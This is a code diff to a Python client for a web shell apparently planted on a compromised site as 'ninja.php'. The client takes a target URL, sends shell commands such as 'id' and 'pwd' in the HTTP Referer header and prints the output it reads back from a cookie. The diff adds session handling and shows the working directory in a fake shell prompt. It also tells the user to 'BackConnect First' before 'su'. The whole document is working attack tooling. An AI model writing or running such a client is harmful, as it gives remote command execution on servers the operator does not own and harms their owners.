@@ -35,7 +35,10 @@ print(bcolors.FAIL + '''
 
 def main():
     print("")
-    cmd = input(bcolors.FAIL + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + "~" + bcolors.ENDC + "$ ")
+    getcwd = 'pwd'
+    d = session.get(target, headers={"Referer":getcwd})
+    cwd = unquote(d.cookies['x'].replace('+',' '))
+    cmd = input(bcolors.FAIL + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + cwd)
     if cmd == "su":
         print("")
         print(bcolors.FAIL + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
@@ -46,7 +49,7 @@ def main():
         main()
     else:
         try:
-            r=requests.get(target, headers={"Referer":cmd})
+            r=session.get(target, headers={"Referer":cmd})
             print(unquote(r.cookies['x'].replace('+',' ')))
             main()
         except:
@@ -54,10 +57,17 @@ def main():
             main()
 
 
+
+
 target = input("Target site (http://xxxxx.com/ninja.php) > ")
 print('(type exit to exit)')
 print('')
 parsed_uri = urlparse(target)
 domain = '{uri.netloc}'.format(uri=parsed_uri)
+
+session = requests.Session()
+r = session.head(target, headers={"Referer": "id"})
+print("cookie: " + r.headers["Set-Cookie"])
+
 
 main()
